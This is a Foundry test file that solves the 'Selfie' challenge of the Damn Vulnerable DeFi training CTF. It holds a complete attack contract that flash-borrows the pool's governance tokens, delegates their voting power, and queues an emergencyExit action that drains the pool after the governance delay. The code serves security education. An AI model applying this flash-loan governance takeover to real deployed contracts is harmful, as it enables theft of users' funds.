// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";



contract Attack is IERC3156FlashBorrower{

    SimpleGovernance governance;
    SelfiePool pool;
    address payable public receiver;

    constructor(SelfiePool _pool, address payable _receiver, SimpleGovernance _governance){
        pool = _pool;
        receiver = _receiver;
        governance = _governance;

    }
    
    function attack() external {
       // Request a flash loan for the maximum amount of tokens in the pool
        pool.flashLoan(this,governance.getVotingToken(),pool.maxFlashLoan(governance.getVotingToken()), bytes(""));        
    }


    function onFlashLoan(
            address initiator,
            address token,
            uint256 amount,
            uint256 fee,
            bytes calldata data
        ) external  override returns (bytes32) {
        
            // Take a snapshot to have voting power
            DamnValuableVotes(token).delegate(address(this));

            // Queue the action to drain all funds to the recovery address
            governance.queueAction(address(pool),0, abi.encodeCall(pool.emergencyExit,(receiver)));

            // Approve the pool to pull the owed amount
            DamnValuableVotes(token).approve(address(pool), amount + fee);

            return keccak256("ERC3156FlashBorrower.onFlashLoan");
        }

    // Fallback to receive ETH
   receive() external payable {
        console.log("payed");
   }

}


contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /*
        The exploit takes advantage of the governance delay mechanism. 
        By taking a flash loan and queuing an action to drain the pool's funds, the attacker can execute 
        the action after the delay, even though they no longer have the necessary voting power. 
    */

    function test_selfie() public checkSolvedByPlayer {
 
        //Deploy the attack contract
        Attack attack = new Attack(pool,payable(recovery), governance) ;
        attack.attack();


        // Advance time by 2 days to surpass governance delay
        skip(2 days);

        // Execute the queued action
        governance.executeAction(1);
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
